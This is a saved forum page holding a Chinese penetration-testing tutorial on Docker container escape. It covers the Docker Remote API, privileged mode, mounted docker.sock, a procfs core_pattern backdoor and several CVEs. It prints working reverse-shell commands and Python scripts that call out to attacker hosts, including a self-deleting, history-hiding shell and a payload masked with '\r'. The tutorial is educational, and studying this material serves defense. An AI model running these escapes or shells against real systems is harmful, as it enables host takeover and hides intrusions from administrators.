@@ -1,0 +1,769 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <title>渗透测试之Docker逃逸 - 先知社区</title>
+    <meta name="description" content="先知社区，先知安全技术社区">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    <link rel="icon" href="https://xz.aliyun.com/static/icon/favicon.ico" type="image/x-icon">
+    <link href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/editormd.min.css">
+    <link rel="stylesheet" href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/tango.css">
+    <link href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/bootstrap-responsive.min.css" rel="stylesheet">
+    <!-- Le styles -->
+    <link rel="stylesheet" href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/OverlayStyle.css">
+    <link rel="stylesheet" href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/topic.css">
+    <link rel="stylesheet" href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/beautify.css">
+    
+    <link rel="stylesheet" href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/editormd.css">
+    <link rel="stylesheet" href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/tango.css">
+    <link rel="stylesheet" href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/jquery.fancybox.min.css">
+
+    <!--[if lte IE 8]>
+        <script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
+    <![endif]-->
+    
+    
+
+    <!--[if !IE]> -->
+    <script type="text/javascript" src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/jquery-2.1.3.min.js"></script>
+    
+    
+    <script src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/jquery.fancybox.min.js"></script>
+
+    <!-- <![endif]-->
+<style>.crx_bdwk_down_wrap {
+    top: 70%;
+    left: 0;
+    position: fixed;
+    z-index: 99999999;
+    color: #fff;
+    user-select: none;
+}
+
+    .crx_bdwk_down_wrap .crx_bdwk_down_loading {
+        background-color: #666;
+        cursor: wait;
+        width: 126px;
+        text-align: center;
+        padding: 16px 0;
+    }
+
+    .crx_bdwk_down_wrap .crx_bdwk_down_loading p {
+            font-size: 14px;
+        }
+
+    .crx_bdwk_down_wrap .crx_bdwk_down_loading small {
+            font-size: 10px;
+        }
+
+    .crx_bdwk_down_wrap .crx_bdwk_down_btn {
+        width: 126px;
+        height: 60px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        font-size: 14px;
+        background-color: #dd5a57;
+        position: relative;
+    }
+
+    .crx_bdwk_down_wrap .crx_bdwk_down_types {
+        display: flex;
+        text-align: center;
+        align-items: center;
+        background-color: #666;
+        font-size: 12px;
+    }
+
+    .crx_bdwk_down_wrap .crx_bdwk_down_types div {
+            position: relative;
+        }
+
+    .crx_bdwk_down_wrap .crx_bdwk_down_types div:after {
+                content: ' ';
+                height: 12px;
+                width: 1px;
+                background-color: #eee;
+                position: absolute;
+                top: 10px;
+                right: 0;
+                transform: scaleX(0.5);
+            }
+
+    .crx_bdwk_down_wrap .crx_bdwk_down_types div:last-child:after {
+                    display: none;
+                }
+
+    .crx_bdwk_down_wrap .crx_bdwk_down_types_check {
+            flex: 1;
+            color: #dd5a57;
+            padding: 8px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+    .crx_bdwk_down_wrap .crx_bdwk_down_types_uncheck {
+            flex: 1;
+            padding: 8px;
+            cursor: pointer;
+            color: #fff;
+            font-weight: lighter;
+        }
+</style></head>
+<body>
+<!-- navbar begin -->
+<div class="navbar navbar-default">
+    <div class="navbar-inner">
+        <div class="container" style="text-align: center; position:relative;">
+            <!--[if lte IE 8]>
+            <span style="display:inline-block;margin:0 auto;color:red;">为了更好的体验，请使用IE10及以上版本</span>
+            <![endif]-->
+            <div class="brand-box">
+                <a class="brand" href="https://xz.aliyun.com/tab/1"></a>
+            </div>
+            
+                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F8558%3Fpage%3D34&amp;from_type=xianzhi" class="pull-right anonymous-user hh_loding">
+                    登录</a>
+            
+            <div class="nav-collapse collapse">
+                <div class="search d1 text-right">
+                    <form method="get" action="/search">
+                        <input type="text" placeholder="搜索" name="keyword">
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- navbar end -->
+<!-- main content begin -->
+<div id="Wrapper" class="container">
+    
+    
+    <div class="row2">
+        <div class="span10">
+            
+    
+
+
+
+    <script src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/jquery.toc.min.js"></script>
+    <script src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/toc.min.js"></script>
+    <script src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/dt.js"></script>
+    
+
+
+<div class="row box content">
+    
+    <div class="box-container">
+        <div class="main-topic">
+            <div class="clearfix user-info topic-list">
+                <p><span class="content-title ">渗透测试之Docker逃逸</span>
+                </p>
+                <div class="topic-info">
+                <span class="info-left">
+                    <a href="https://xz.aliyun.com/u/27131">
+                        <span class="username cell"> IFONLY</span></a> <span class="i-seprator"> / </span>
+                    <span> 2020-12-01 09:35:00</span><span class="i-seprator"> / </span>
+                    
+                    <span>浏览数 19389</span>
+                    
+                    
+                    <span class="content-node">
+                    
+                        <span class="label label-default label-node-first">
+                            <a href="https://xz.aliyun.com/tab/4">社区板块</a></span>
+                        <span class="label label-default">
+                            <a href="https://xz.aliyun.com/node/27">渗透测试</a></span>
+                    
+                    </span>
+                </span>
+                    <span class="pull-right t-vote cell info-right"><a class="vote vote-up" href="javascript:" onclick="voteUp(8558);">
+             顶(1)</a>
+             <a class="vote vote-down" href="javascript:" onclick="voteDown(8558);">
+             踩(0)</a></span>
+                </div>
+            </div>
+            <hr>
+            <div id="topic_content" class="topic-content markdown-body">
+                <h1>渗透测试之Docker逃逸</h1>
+<h2 id="toc-0">前言</h2>
+<p>在t00ls 看到一篇渗透测试的<a href="https://www.t00ls.net/thread-58322-1-1.html" target="_blank">文章</a>，里面docker逃逸的部分，感觉有意思。这方面我是空白，所以打算记录下利用。新手文章，难免有错，还望师傅们指正交流。</p>
+<hr>
+<p>Docker 
+逃逸在渗透测试中面向的场景大概是这样，渗透拿到shell后，发现主机是docker环境，要进一步渗透，就必须逃逸到“直接宿主机”。甚至还有物理机
+运行虚拟机，虚拟机运行Docker容器的情况。那就还要虚拟机逃逸了。篇幅有限，本文记录Docker逃逸相关技术重点、尽最大可能进行利用复现。</p>
+<h2 id="toc-1">如何判断当前机器是否为Docker 容器环境</h2>
+<ul>
+<li><p>Metasploit 中的 checkcontainer 模块、（判断是否为虚拟机，checkvm 模块）<br>
+该模块其实进行了如下操作：</p>
+</li>
+<li><p>检查根目录下是否存在<code>.dockerenv</code>文件<br>
+<a id="img0" href="https://xzfile.aliyuncs.com/media/upload/picture/20201122222151-109b39ba-2cce-1.jpg"><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20201122222151-109b39ba-2cce-1.jpg"></a></p>
+</li>
+<li><p>检查 <code>/proc/1/cgroup</code> 是否存在含有docker字符串!<br>
+<a id="img1" href="https://xzfile.aliyuncs.com/media/upload/picture/20201122222211-1c211f0c-2cce-1.jpg"><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20201122222211-1c211f0c-2cce-1.jpg"></a></p>
+</li>
+<li><p>检查是否存在container环境变量<br>
+通过<code>env</code> \ <code>PATH</code> 来检查是否有docker相关的环境变量，来进一步判断。</p>
+</li>
+<li>其他检测方式</li>
+</ul>
+<p>如检测mount、fdisk -l查看硬盘 、判断PID 1的进程名等也可用来辅助判断。</p>
+<h2 id="toc-2">Docker 逃逸的方法</h2>
+<h3 id="toc-3">危险的配置导致Docker 逃逸</h3>
+<p>由于"纵深防御" 和 
+"最小权限"等理念和原则落地，越来越难以直接利用漏洞来进行利用。另一方面，公开的漏洞，安全运维人员能够及时将其修复，当然，不免存在漏网之鱼。相
+反，更多的是利用错误的、危险的配置来进行利用，不仅仅Docker逃逸，其他漏洞也是，比如生产环境开启Debug模式导致漏洞利用等等。</p>
+<blockquote><p>Docker已经将容器运行时的Capabilities黑名单机制改为如今的默认禁止所有Capabilities，再以白名单方式赋予容器运行所需的最小权限。</p>
+</blockquote>
+<h4>Docker Remote API 未授权访问</h4>
+<p>Vulhub提供了该漏洞的复现环境。</p>
+<p>利用方法是，我们随意启动一个容器，并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。</p>
+<p>Docker Remote API 的端口为 2375端口。<br>
+反弹Shell exp：</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">docker</span>
+
+<span class="n">client</span> <span class="o">=</span> <span class="n">docker</span><span class="o">.</span><span class="n">DockerClient</span><span class="p">(</span><span class="n">base_url</span><span class="o">=</span><span class="s1">'http://your-ip:2375/'</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">containers</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s1">'alpine:latest'</span><span class="p">,</span> <span class="sa">r</span><span class="s1">'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' &gt;&gt; /tmp/etc/crontabs/root" '''</span><span class="p">,</span> <span class="n">remove</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">volumes</span><span class="o">=</span><span class="p">{</span><span class="s1">'/etc'</span><span class="p">:</span> <span class="p">{</span><span class="s1">'bind'</span><span class="p">:</span> <span class="s1">'/tmp/etc'</span><span class="p">,</span> <span class="s1">'mode'</span><span class="p">:</span> <span class="s1">'rw'</span><span class="p">}})</span>
+</pre></div>
+<p>Github上的exp：<a href="https://github.com/Tycx2ry/docker_api_vul" target="_blank">https://github.com/Tycx2ry/docker_api_vul</a><br>
+<a id="img2" href="https://xzfile.aliyuncs.com/media/upload/picture/20201122222340-513328c0-2cce-1.jpg"><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20201122222340-513328c0-2cce-1.jpg"></a></p>
+<h4>Docker 高危启动参数 -- privileged 特权模式启动容器</h4>
+<blockquote><p>当操作者执行docker run --privileged时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。</p>
+</blockquote>
+<p>特权模式启动一个Ubuntu容器：<br>
+<code>sudo docker run -itd --privileged ubuntu:latest /bin/bash</code><br>
+进入容器：<br>
+使用<code>fdisk</code> 命令查看磁盘文件：</p>
+<p><a id="img3" href="https://xzfile.aliyuncs.com/media/upload/picture/20201122222432-70a8739a-2cce-1.jpg"><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20201122222432-70a8739a-2cce-1.jpg"></a></p>
+<blockquote><p>在特权模式下，逃逸的方式很多，比如：直接在容器内部挂载宿主机磁盘，然后切换根目录。</p>
+</blockquote>
+<p>新建一个目录：<code>mkdir /test</code><br>
+挂载磁盘到新建目录：<code>mount /dev/vda1 /test</code><br>
+切换根目录：<code>chroot /test</code><br>
+到这里已经成功逃逸了，然后就是常规的反弹shell 和 写 SSH 了(和redis未授权差不多）。<br>
+<a id="img4" href="https://xzfile.aliyuncs.com/media/upload/picture/20201122222657-c6c4aa64-2cce-1.jpg"><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20201122222657-c6c4aa64-2cce-1.jpg"></a></p>
+<p>写计划任务，反弹宿主机Shell。<br>
+<code>echo '* * * * * /bin/bash -i &gt;&amp; /dev/tcp/39.106.51.35/1234 0&gt;&amp;1' &gt;&gt; /test/var/spool/cron/crontabs/root</code></p>
+<p>如果要写SSH的话，需要挂载宿主机的root目录到容器。<br>
+docker run -itd -v /root:/root ubuntu:18.04 /bin/bash<br>
+mkdir /root/.ssh<br>
+cat id_rsa.pub &gt;&gt; /root/.ssh/authorized_keys<br>
+然后ssh 私钥登录。</p>
+<p>其他参数：<br>
+Docker 通过Linux namespace实现6项资源隔离，包括主机名、用户权限、文件系统、网络、进程号、进程间通讯。但部分启动参数授予容器权限较大的权限，从而打破了资源隔离的界限。</p>
+
+<pre><code>--cap-add=SYS_ADMIN  启动时，允许执行mount特权操作，需获得资源挂载进行利用。
+    --net=host           启动时，绕过Network Namespace
+    --pid=host              启动时，绕过PID Namespace
+    --ipc=host              启动时，绕过IPC Namespace</code></pre>
+<h3 id="toc-4">危险挂载导致Docker 逃逸</h3>
+<p>挂载目录（-v /:/soft）</p>
+
+<pre><code>docker run -itd -v /dir:/dir ubuntu:18.04 /bin/bash</code></pre>
+<h4>挂载Docker Socket</h4>
+<p>Docker采用C/S架构，我们平常使用的Docker命令中，docker即为client，Server端的角色由docker daemon扮演，二者之间通信方式有以下3种：</p>
+<ul>
+<li>unix:///var/run/docker.sock(默认</li>
+<li>tcp://host:port</li>
+<li>fd://socketfd</li>
+</ul>
+<p>Docker Socket是Docker守护进程监听的Unix域套接字，用来与守护进程通信——查询信息或下发命令。</p>
+<p>逃逸复现：</p>
+<ol>
+<li><p>首先创建一个容器并挂载/var/run/docker.sock；<br>
+docker run -itd -v /var/run/docker.sock:/var/run/docker.sock ubuntu</p>
+</li>
+<li><p>在该容器内安装Docker命令行客户端；<br>
+apt-update<br>
+apt-get install \<br>
+ apt-transport-https \<br>
+ ca-certificates \<br>
+ curl \<br>
+ gnupg-agent \<br>
+ software-properties-common<br>
+ curl -fsSL <a href="https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg" target="_blank">https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg</a> | apt-key add -<br>
+apt-key fingerprint 0EBFCD88<br>
+add-apt-repository \<br>
+"deb [arch=amd64] <a href="https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/" target="_blank">https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/</a> \<br>
+$(lsb_release -cs) \<br>
+stable"<br>
+apt-get update<br>
+apt-get install docker-ce docker-ce-cli containerd.io</p>
+</li>
+<li><p>接着使用该客户端通过Docker Socket与Docker守护进程通信，发送命令创建并运行一个新的容器，将宿主机的根目录挂载到新创建的容器内部；docker run -it -v /:/host ubuntu:18.04 /bin/bash<br>
+<a id="img5" href="https://xzfile.aliyuncs.com/media/upload/picture/20201122222804-eecbe342-2cce-1.jpg"><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20201122222804-eecbe342-2cce-1.jpg"></a></p>
+</li>
+<li><p>在新容器内执行chroot将根目录切换到挂载的宿主机根目录。chroot /test<br>
+<a id="img6" href="https://xzfile.aliyuncs.com/media/upload/picture/20201122222833-ffba6412-2cce-1.jpg"><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20201122222833-ffba6412-2cce-1.jpg"></a><br>
+已成功逃逸到宿主机。<br>
+<a id="img7" href="https://xzfile.aliyuncs.com/media/upload/picture/20201122222939-27726266-2ccf-1.jpg"><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20201122222939-27726266-2ccf-1.jpg"></a></p>
+</li>
+</ol>
+<h4>挂载宿主机procfs</h4>
+<p>docker run -itd -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu (为了区分，挂载到容器的/host/目录下</p>
+<blockquote><p>procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User Namespace时</p>
+</blockquote>
+<p>从2.6.19内核版本开始，Linux支持在/proc/sys/kernel/core_pattern中使用新语法。如果该文件中的首个字符是管道符|，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。</p>
+<p><strong>Docker默认情况下不会为容器开启User Namespace</strong><br>
+根据参考资料1，一般情况下不会将宿主机的procfs挂载到容器中，然而有些业务为了实现某些特殊需要，还是会有。<br>
+一些细节原理看参考资料1哈，这里专注于利用。<br>
+复现：“在挂载procfs的容器内利用core_pattern后门实现逃逸“<br>
+利用思路：攻击者进入到挂载了宿主机profs的容器，root权限，然后向宿主机的procfs写Payload</p>
+<ul>
+<li>在容器内创建反弹Shell的Exp，/tmp/.x.py (.为隐藏文件</li>
+</ul>
+<p>apt-get update<br>
+apt-get install vim<br>
+apt-get install gcc (用于编译一个可以崩溃的程序，容器环境下一般都不自带这些常用的工具，包括ping之类的。</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">pty</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="n">lhost</span> <span class="o">=</span> <span class="s2">"attacker-ip"</span>
+<span class="n">lport</span> <span class="o">=</span> <span class="mi">10000</span>
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+ <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+ <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">))</span>
+ <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="mi">0</span><span class="p">)</span>
+ <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="mi">1</span><span class="p">)</span>
+ <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="mi">2</span><span class="p">)</span>
+ <span class="n">os</span><span class="o">.</span><span class="n">putenv</span><span class="p">(</span><span class="s2">"HISTFILE"</span><span class="p">,</span> <span class="s2">"/dev/null"</span><span class="p">)</span>
+ <span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">"/bin/bash"</span><span class="p">)</span>
+ <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s2">"/tmp/.x.py"</span><span class="p">)</span>
+ <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+ <span class="n">main</span><span class="p">()</span>
+</pre></div>
+<ul>
+<li>echo -e "|/tmp/.x.py \rcore   " &gt; /host/proc/sys/kernel/core_pattern</li>
+<li>在容器内运行一个可以崩溃的程序</li>
+</ul>
+
+<pre><code>int main(void) {
+int *a = NULL;
+*a = 1;
+return 0;
+}</code></pre>
+<p>这里我仔细检查了很久，和文献中的步骤一样，没有错，就是不弹Shell。然后找到了另一篇文章，并且在7月份的时候有过一次更新。<a href="https://wohin.me/rong-qi-tao-yi-gong-fang-xi-lie-yi-tao-yi-ji-zhu-gai-lan/" target="_blank">https://wohin.me/rong-qi-tao-yi-gong-fang-xi-lie-yi-tao-yi-ji-zhu-gai-lan/</a></p>
+<blockquote><p>这是因为Linux转储机制对/proc/sys/kernel/core_pattern内程序的查找是在宿主机文件系统进行的，而我们的/tmp/.x.py是容器内路径。</p>
+</blockquote>
+<p>根据文章中提到的小技巧，操作一下步骤：<br>
+在Docker容器中：</p>
+<ul>
+<li>cat /proc/mounts | grep docker<br>
+拿到当前容器在宿主机上的绝对路径。
+<pre><code>overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/TDUPJY7LZWCBS33AOAEL32VYWZ:/var/lib/docker/overlay2/l/UDBKLTSYHMCC4J7DLMAK3JUMT2:/var/lib/docker/overlay2/l/ULFSCIS7UXEVHUTW5KPOWLQOK6:/var/lib/docker/overlay2/l/YQDQOJ3EJ3KELBHK5PFFUJ7RVT,upperdir=/var/lib/docker/overlay2/edbf849399cdbcd1d74d7e112b0d548e60e0e90754e3126f8b533ab395bf1dfb/diff,workdir=/var/lib/docker/overlay2/edbf849399cdbcd1d74d7e112b0d548e60e0e90754e3126f8b533ab395bf1dfb/work 0 0</code></pre>
+从返回的内容中得到：workdir=/var/lib/docker/overlay2/edbf849399cdbcd1d74d7e112b0d548e60e0e90754e3126f8b533ab395bf1dfb/work</li>
+</ul>
+<p>将之前的写入Payload的命令改为：<br>
+echo -e 
+"|/var/lib/docker/overlay2/edbf849399cdbcd1d74d7e112b0d548e60e0e90754e3126f8b533ab395bf1dfb/merged/tmp/.x.py
+ \rcore           " &gt; /host/proc/sys/kernel/core_pattern</p>
+<p>其他步骤不变。这样一来，Linux转储机制在程序发生崩溃时就能够顺利找到我们在容器内部的/tmp/.x.py了。</p>
+<p>该漏洞利用的亮点：直接搬参考资料1</p>
+<ol>
+<li><p>payload中使用空格加\r的方式，巧妙覆盖掉了真正的｜/tmp/.x.py，这样一来，即使管理员通过cat /proc/sys/kernel/core_pattern的方式查看，也只能看到core；</p>
+</li>
+<li><p>/tmp/.x.py是一个隐藏文件，直接ls是看不到的；</p>
+</li>
+<li><p>os.remove("/tmp/.x.py")在反弹shell的过程中删掉了用来反弹shell的程序自身。</p>
+</li>
+</ol>
+<h3 id="toc-5">程序漏洞导致Docker 逃逸</h3>
+<h4>runC容器逃逸漏洞 CVE-2019-5736</h4>
+<p>漏洞简述：<br>
+Docker 18.09.2之前的版本中使用了的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。<br>
+利用条件：<br>
+Docker版本 &lt; 18.09.2，runc版本&lt; 1.0-rc6，一般情况下，可通过 docker 和docker-runc 查看当前版本情况。</p>
+<p>利用步骤：<br>
+下载poc<br>
+git clone <a href="https://github.com/Frichetten/CVE-2019-5736-" target="_blank">https://github.com/Frichetten/CVE-2019-5736-</a><br>
+PoC修改Payload<br>
+vi main.go<br>
+payload = "#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/192.168.172.136/1234 0&gt;&amp;1"<br>
+编译生成payload<br>
+CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go<br>
+拷贝到docker容器中执行<br>
+ sudo docker cp ./main 248f8b7d3c45:/tmp</p>
+<p>然后模拟管理员进入容器，就可以收到反弹shell。</p>
+<h4>Docker cp 命令容器逃逸攻击漏洞 CVE-2019-14271</h4>
+<p>漏洞描述：<br>
+当Docker宿主机使用cp命令时，会调用辅助进程docker-tar，该进程没有被容器化，且会在运行时动态加载一些libnss<em>.so库。黑客可以通过在容器中替换libnss</em>.so等库，将代码注入到docker-tar中。当Docker用户尝试从容器中拷贝文件时将会执行恶意代码，成功实现Docker逃逸，获得宿主机root权限。<br>
+影响版本：<br>
+Docker 19.03.0</p>
+<h3 id="toc-6">内核漏洞导致Docker 逃逸</h3>
+<h4>DirtyCow(CVE-2016-5195)脏牛漏洞实现Docker 逃逸</h4>
+<p>Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，通过它可实现Docker容器逃逸，获得root权限的shell。</p>
+<p>Docker 与 宿主机共享内核，因此容器需要在存在dirtyCow漏洞的宿主机里。<br>
+环境获取：git clone <a href="https://github.com/gebl/dirtycow-docker-vdso.git" target="_blank">https://github.com/gebl/dirtycow-docker-vdso.git</a></p>
+<h2 id="toc-7">References</h2>
+<p><a href="https://www.secrss.com/articles/17274" target="_blank">https://www.secrss.com/articles/17274</a><br>
+<a href="https://www.secrss.com/articles/18752" target="_blank">https://www.secrss.com/articles/18752</a><br>
+<a href="https://www.nsfocus.com.cn/uploadfile/2020/0730/20200730065957155.pdf" target="_blank">https://www.nsfocus.com.cn/uploadfile/2020/0730/20200730065957155.pdf</a><br>
+<a href="https://xz.aliyun.com/t/6167" target="_blank">https://xz.aliyun.com/t/6167</a><br>
+<a href="https://xz.aliyun.com/t/6806" target="_blank">https://xz.aliyun.com/t/6806</a><br>
+<a href="https://xz.aliyun.com/t/7881" target="_blank">https://xz.aliyun.com/t/7881</a><br>
+Others:<br>
+<a href="https://www.cnblogs.com/xiaozi/p/13423853.html" target="_blank">https://www.cnblogs.com/xiaozi/p/13423853.html</a><br>
+<a href="https://blog.csdn.net/qq_36148847/article/details/79294196" target="_blank">https://blog.csdn.net/qq_36148847/article/details/79294196</a><br>
+<a href="https://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank">https://www.runoob.com/docker/ubuntu-docker-install.html</a></p>
+
+            </div>
+            
+
+            <div class="post-user-action" style="margin-top: 34px;">
+                <span class="btn btn-default pull-right" id="mark" data-action="topic" data-pk="8558">
+                    <span id="mark-text">点击收藏 </span><span class="i-seprator"> | </span><span id="mark-count">4</span>
+                </span>
+                
+                    <span class="btn btn-default pull-right" id="follow_topic" data-pk="8558">
+                     <span>关注</span><span class="i-seprator"> | </span><span id="follow-count">1</span>
+                    </span>
+                
+                <div class="clearfix"></div>
+            </div>
+            
+                <div class="related-section">
+                    <div class="related-box">
+                        
+                            <span><a class="pull-left" href="https://xz.aliyun.com/t/8557" title="【知识回顾】Cobalt Strike 4.0 认证及修补过程"><span class="related-label" style="padding: 3px 4px;margin-right: 3px;">上一篇：</span>【知识回顾】Cobalt Stri...</a></span>
+                        
+                        
+                            <span><a class="pull-left" href="https://xz.aliyun.com/t/8566" title="记一次HW打点"><span class="related-label" style="">下一篇：</span>记一次HW打点</a></span>
+                        
+                    </div>
+                </div>
+            
+        </div>
+    </div>
+</div>
+
+    <!-- topic & appendix -->
+    
+
+
+
+<div class="row box">
+    <ol class="breadcrumb">
+        <li class="active">2 条回复</li>
+    </ol>
+    <div class="box-container post-container">
+        
+            
+                <ul class="post-info" id="reply-17604">
+                    <li>
+                        <div class="row1 user-info clearfix">
+                            
+                                <img class="avatar pull-left tiny-avatar" src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BDocker%E9%80%83%E9%80%B8%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/default_avatar.png">
+                            
+                            <span class="post-info ">
+                                 
